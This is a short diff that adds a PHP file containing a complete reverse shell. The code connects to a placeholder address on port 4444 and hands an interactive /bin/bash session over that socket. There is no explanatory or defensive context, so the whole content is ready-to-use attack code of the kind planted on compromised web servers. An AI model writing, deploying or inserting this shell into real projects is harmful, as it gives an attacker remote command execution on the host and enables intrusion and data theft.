@@ -1,0 +1,11 @@
+<?php
+$ip = 'Target_IP';  // Example: 192.168.1.100
+$port = 4444;
+
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/bash', [
+    0 => $sock,
+    1 => $sock,
+    2 => $sock
+], $pipes);
+?>
